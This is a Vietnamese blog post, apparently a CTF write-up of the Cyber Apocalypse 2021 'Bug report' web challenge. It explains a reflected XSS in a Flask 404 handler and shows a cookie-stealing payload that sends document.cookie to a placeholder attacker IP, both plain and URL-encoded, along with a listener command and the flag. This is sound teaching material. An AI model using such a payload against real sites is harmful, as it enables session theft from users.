@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.79.1 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Manh NV">
+<meta name="keywords" content=", manhnv, development, cyber security, hacker, CTF, CTF writeup">
+<meta name="description" content="1. Đề bài Vẫn là loạt bài writeup các challenge của cuộc thi Cyber Apocalypse 2021, lần này vẫn là một bài review source code nhưng dễ hơn. Và vẫn là câu nói cũ Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.
+Source code cho như dưới đây.
+2. Bắt đầu chiến nào Như mình đã nói ở trên lần này vẫn là một bài review source code nhưng dễ hơn.">
+
+
+<meta property="og:description" content="1. Đề bài Vẫn là loạt bài writeup các challenge của cuộc thi Cyber Apocalypse 2021, lần này vẫn là một bài review source code nhưng dễ hơn. Và vẫn là câu nói cũ Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.
+Source code cho như dưới đây.
+2. Bắt đầu chiến nào Như mình đã nói ở trên lần này vẫn là một bài review source code nhưng dễ hơn.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Cyber Apocalypse 2021]- Web &#39;Bug report&#39; writeup">
+<meta name="twitter:title" content="[Cyber Apocalypse 2021]- Web &#39;Bug report&#39; writeup">
+<meta property="og:url" content="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+<meta property="twitter:url" content="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+<meta property="og:site_name" content="Chia sẻ là niềm vui">
+<meta property="og:description" content="1. Đề bài Vẫn là loạt bài writeup các challenge của cuộc thi Cyber Apocalypse 2021, lần này vẫn là một bài review source code nhưng dễ hơn. Và vẫn là câu nói cũ Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.
+Source code cho như dưới đây.
+2. Bắt đầu chiến nào Như mình đã nói ở trên lần này vẫn là một bài review source code nhưng dễ hơn.">
+<meta name="twitter:description" content="1. Đề bài Vẫn là loạt bài writeup các challenge của cuộc thi Cyber Apocalypse 2021, lần này vẫn là một bài review source code nhưng dễ hơn. Và vẫn là câu nói cũ Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.
+Source code cho như dưới đây.
+2. Bắt đầu chiến nào Như mình đã nói ở trên lần này vẫn là một bài review source code nhưng dễ hơn.">
+<meta property="og:locale" content="vi">
+
+  
+    <meta property="article:published_time" content="2021-05-05T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-05-05T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+  
+  
+    
+      <meta property="article:tag" content="ctf">
+    
+      <meta property="article:tag" content="Cyber Apocalypse 2021">
+    
+      <meta property="article:tag" content="ctf web writeup">
+    
+      <meta property="article:tag" content="writeup">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png">
+  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png">
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/favicon.png">
+  <meta property="twitter:image" content="https://manhnv.com/favicon.png">
+
+
+    <title>[Cyber Apocalypse 2021]- Web &#39;Bug report&#39; writeup</title>
+
+    <link rel="icon" href="https://manhnv.com/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://manhnv.com/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://manhnv.com/css/mystyle.css">
+      
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-128983514-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    <meta property="fb:pages" content="447047472469512" />
+
+<div id="fb-root"></div>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml            : true,
+      version          : 'v9.0'
+    });
+  };
+
+  (function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script async defer crossorigin="anonymous" src="https://connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v10.0&appId=289802794723623&autoLogAppEvents=1" nonce="mBBqfgRB"></script>
+
+
+<div class="fb-customerchat"
+  attribution="setup_tool"
+  page_id="447047472469512"
+theme_color="#20cef5"
+logged_in_greeting="Hi! How can I help you?"
+logged_out_greeting="Hi! How can I help you?">
+</div>
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://manhnv.com/">Chia sẻ là niềm vui</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://manhnv.com/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://manhnv.com/#about">
+          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        </a>
+        <h4 class="sidebar-profile-name">Manh NV</h4>
+        
+          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/donate.html">
+    
+      <i class="sidebar-button-icon fa fa-usd"></i>
+      
+      <span class="sidebar-button-desc">Donate</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Trang chủ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Danh mục</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Thẻ thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Lưu trữ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">Thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/copyrights">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
+      
+      <span class="sidebar-button-desc">Copyrights</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/nguyenmanh1997" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://facebook.com/manhnv.sec" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
+      
+      <span class="sidebar-button-desc">Youtube</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      [Cyber Apocalypse 2021]- Web &#39;Bug report&#39; writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-05-05T00:00:00Z">
+        
+  tháng 5 5, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>mục</span>
+    
+      <a class="category-link" href="https://manhnv.com/categories/ctf">ctf</a>
+    
+  
+
+     | 
+    <a href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/#post-comments">
+    <i class="fa fa-comments-o" aria-hidden="true"></i>
+    <span class="fb-comments-count" data-href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/"></span>
+</a>
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <h2 id="1-đề-bài">1. Đề bài</h2>
+<p>Vẫn là loạt bài writeup các challenge của cuộc thi <code>Cyber Apocalypse 2021</code>, lần này vẫn là một bài <code>review source code</code> nhưng dễ hơn. Và vẫn là câu nói cũ <code>Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.</code></p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png"></p>
+<p>Source code cho như dưới đây.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.31.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.31.png"></p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.38.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.38.png"></p>
+<h2 id="2-bắt-đầu-chiến-nào">2. Bắt đầu chiến nào</h2>
+<p>Như mình đã nói ở trên <em>lần này vẫn là một bài <code>review source code</code> nhưng dễ hơn</em>. Tại sao mình lại nói như thế? Vì đơn giản là nó dễ thật.</p>
+<h3 id="21-tìm-hiểu-chức-năng-có-lỗi">2.1 Tìm hiểu chức năng có lỗi</h3>
+<p>Khi mở source code, đập vào mắt mình là một chức năng gặp lỗi.
+<img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/error-handling-404.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/error-handling-404.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">404</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page_not_found</span>(error): 
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&lt;h1&gt;URL </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> not found&lt;/h1&gt;&lt;br/&gt;&#34;</span> <span style="color:#f92672">%</span> unquote(request<span style="color:#f92672">.</span>url), <span style="color:#ae81ff">404</span>
+</code></pre></div><p>Vì sao mình khẳng định là đoạn code này có lỗi?</p>
+<p>Mình giải thích luôn, với biến <code>request.url</code> là sẽ lấy đường dẫn đầy đủ của ứng dụng. Ví dụ trong trường hợp này ứng dụng đang chạy port 1337 và đường dẫn có thể dẫn đến lỗi 404 là <code>/not-found</code>, thì <code>request.url</code> sẽ trả về là <code>http://domain/not-found</code>.</p>
+<p>Hàm <code>unquote()</code> thì được mô tả là <code>Replace %xx escapes with their single-character equivalent. The optional encoding and errors parameters specify how to decode percent-encoded sequences into Unicode characters, as accepted by the bytes.decode() method.</code> Ok, vậy hiểu đơn giản nhé, thì nó sẽ urldecode. Ví dụ: <code>%22Manhnv%22</code> =&gt; <code>&quot;Manhnv&quot;</code>.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/unquote-function.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/unquote-function.png"></p>
+<p>Tham khảo thêm tại đây: <a href="https://docs.python.org/3/library/urllib.parse.html">https://docs.python.org/3/library/urllib.parse.html</a></p>
+<p>Để chứng minh điều này, tôi dựng lại source trên local và chạy nó nhé.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/not-found.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/not-found.png"></p>
+<hr>
+<p>Oh, vậy rồi sao? làm gì tiếp theo?</p>
+<p>Tôi để ý dòng <code>return &quot;&lt;h1&gt;URL %s not found&lt;/h1&gt;&lt;br/&gt;&quot; % unquote(request.url)</code>, nó sử dụng nối chuỗi để return về mà không filter hay escape gì cả, vậy thì đây là một lỗi XSS. Tôi thử một đoạn XSS đơn giản như vầy.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div><p>Url encode sẽ là</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre></div><p>Đường dẫn đầy đủ</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://138.68.147.93:31927/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.43.52.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.43.52.png"></p>
+<p>Đấy, XSS đó thấy chưa nào.</p>
+<hr>
+<h3 id="22-tìm-hiểu-cách-hoạt-động-của-bot">2.2 Tìm hiểu cách hoạt động của bot</h3>
+<p>Đến đây, có XSS rồi thì để ý tiếp nhé.</p>
+<p>Trong source code có một file <code>bot.py</code>. Tôi cần tìm hiểu cách nó hoạt động.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/source-code-bot.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/source-code-bot.png"></p>
+<p>File <code>bot.py</code> có một hàm tên là <code>visit_report()</code>, tham số truyền vào là một <code>url</code>. Khi hàm này được gọi (call), ứng dụng sẽ sử dụng thư viện <code>selenium</code> dùng <code>chromedriver</code> làm browser để thực hiện mở <code>http://127.0.0.1:1337/</code>, sau đó browser sẽ được add cookie (trong cookie được add có chứa flag). Tiếp theo browser thực hiện mở đường dẫn trong biến <code>url</code> được truyền vào dòng 37 <code>browser.get(url)</code>. Đến đây, tạm thời hiểu được cách hoạt động của bot.</p>
+<h2 id="23-tìm-hiểu-cách-để-call-function-của-bot-như-ý">2.3 Tìm hiểu cách để call function của bot như ý</h2>
+<p>Tiếp tục tìm hiểu chức năng khác, khi vào web có một form submit như dưới</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png"></p>
+<p>Đại loại là: <code>Hãy submit cho chúng tôi URL mà bạn không truy cập được</code></p>
+<p>Khi tôi thử điền gì đó và submit thì thấy ứng dụng call đến API <code>/api/submit</code>. Nhìn lại source code xem thử ứng dụng xử lý những gì khi đi vào <code>/api/submit</code>.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/api-submit.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/api-submit.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/submit&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>():
+    <span style="color:#66d9ef">try</span>:
+        url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;url&#34;</span>)
+        
+        <span style="color:#66d9ef">assert</span>(url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;http://&#39;</span>) <span style="color:#f92672">or</span> url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;https://&#39;</span>))
+        visit_report(url)
+
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;success&#34;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Thank you for your valuable submition!&#34;</span>}
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;failure&#34;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Something went wrong.&#34;</span>}
+</code></pre></div><p><strong>Giải thích:</strong> Khi đi vào <code>/api/submit</code>, ứng dụng sẽ lấy giá trị từ biến <code>url</code> của dữ liệu gửi lên. Sau đó kiểm tra xem có phải là đường dẫn hay không bằng cách kiểm tra sự tồn tại của <code>http</code> hoặc <code>https</code> ở đầu chuỗi, nếu không có sẽ raise ra lỗi.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">assert</span>(url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;http://&#39;</span>) <span style="color:#f92672">or</span> url<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;https://&#39;</span>))
+</code></pre></div><p>Sau đó biến url sẽ được truyền vào function <code>visit_report()</code>.</p>
+<h2 id="3-khai-thác-thôi">3. Khai thác thôi</h2>
+<p>Từ những điều tìm hiểu được bên trên, tôi có thể hình dung ra ứng dụng đang có một số điểm có thể khai thác được như sau:</p>
+<ol>
+<li>Ứng dụng gặp lỗi XSS</li>
+<li>Ứng dụng có Bot sẽ request cùng cookie chứa đến đường dẫn do người dùng gửi lên.</li>
+</ol>
+<p>Như vậy, ý tưởng tôi có là: Tạo một đường dẫn có XSS với payload javascript là để steal cookie và submit lên để bot request tới đường dẫn đó.</p>
+<p>Tôi viết một payload như sau:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://127.0.0.1:1337/&lt;script tyle=&#34;text/javascript&#34;&gt;document.location=&#39;http://**&lt;ip-attacker&gt;**:8000/?c=&#39;+document.cookie;&lt;/script&gt;
+</code></pre></div><p>Sau khi Url encode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://127.0.0.1:1337/%3c%73%63%72%69%70%74%20%74%79%6c%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%3c%69%70%2d%61%74%74%61%63%6b%65%72%3e%3a%38%30%30%30%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
+</code></pre></div><p>Trên server của tôi, tôi tạo một http simple server như sau:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">8000</span>
+</code></pre></div><p>Bây giờ chỉ việc submit payload vào form submit.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.48.53.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.48.53.png"></p>
+<p>Kiểm tra server và nhận được flag.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.49.24.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.49.24.png"></p>
+<p>Flag là: <code>CHTB{th1s_1s_my_bug_r3p0rt}</code></p>
+<h2 id="kết-luận">Kết luận</h2>
+<p>Một bài khá là dễ, tuy nhiên khá là hay.
+Đọc qua bài này, hi vọng các bạn có thể hiểu cách mình tìm hiểu và khai thác lỗi khi có source code như thế nào.</p>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf/">ctf</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 2021</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf-web-writeup/">ctf web writeup</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/writeup/">writeup</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+    
+        <nav >
+          <ul class="post-actions post-action-nav">
+            
+              <li class="post-action">
+                
+                  <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                  </a>
+              </li>
+              <li class="post-action">
+                
+                  <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-alien-complaint-form-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web &#39;Alien complaint form&#39; writeup">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                    <i class="fa fa-angle-right"></i>
+                  </a>
+              </li>
+            
+          </ul>
+        </nav>
+      <ul class="post-actions post-action-share" >
+        
+          <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+              <i class="fa fa-share-alt"></i>
+            </a>
+          </li>
+          
+            <li class="post-action hide-xs">
+              <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+                <i class="fa fa-facebook-official"></i>
+              </a>
+            </li>
+          
+            <li class="post-action hide-xs">
+              <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+                <i class="fa fa-twitter"></i>
+              </a>
+            </li>
+          
+        
+        
+        
+            
+            
+            
+        <li class="post-action">
+            <a class="post-action-btn btn btn--default" href="#post-comments">
+                <i class="fa fa-comment-o"></i>
+            </a>
+        </li>
+        
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default" href="#">
+          
+            <i class="fa fa-list"></i>
+          </a>
+        </li>
+      </ul>
+    
+  </div>
+  
+            <div id="post-comments">
+                
+                
+
+                <div class="fb-comments" data-href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/" data-width="100%" data-numposts="5"></div>
+                
+            </div>
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 <a href="https://manhnv.com">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+    
+        <nav >
+          <ul class="post-actions post-action-nav">
+            
+              <li class="post-action">
+                
+                  <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                  </a>
+              </li>
+              <li class="post-action">
+                
+                  <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/05/cyber-apocalypse-2021-web-alien-complaint-form-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web &#39;Alien complaint form&#39; writeup">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                    <i class="fa fa-angle-right"></i>
+                  </a>
+              </li>
+            
+          </ul>
+        </nav>
+      <ul class="post-actions post-action-share" >
+        
+          <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+              <i class="fa fa-share-alt"></i>
+            </a>
+          </li>
+          
+            <li class="post-action hide-xs">
+              <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+                <i class="fa fa-facebook-official"></i>
+              </a>
+            </li>
+          
+            <li class="post-action hide-xs">
+              <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/05/cyber-apocalypse-2021-web-bug-report-writeup/">
+                <i class="fa fa-twitter"></i>
+              </a>
+            </li>
+          
+        
+        
+        
+            
+            
+            
+        <li class="post-action">
+            <a class="post-action-btn btn btn--default" href="#post-comments">
+                <i class="fa fa-comment-o"></i>
+            </a>
+        </li>
+        
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default" href="#">
+          
+            <i class="fa fa-list"></i>
+          </a>
+        </li>
+      </ul>
+    
+  </div>
+  
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2F2021%2F05%2Fcyber-apocalypse-2021-web-bug-report-writeup%2F">
+          <i class="fa fa-facebook-official"></i><span>Chia sẻ với Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2F2021%2F05%2Fcyber-apocalypse-2021-web-bug-report-writeup%2F">
+          <i class="fa fa-twitter"></i><span>Chia sẻ với Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
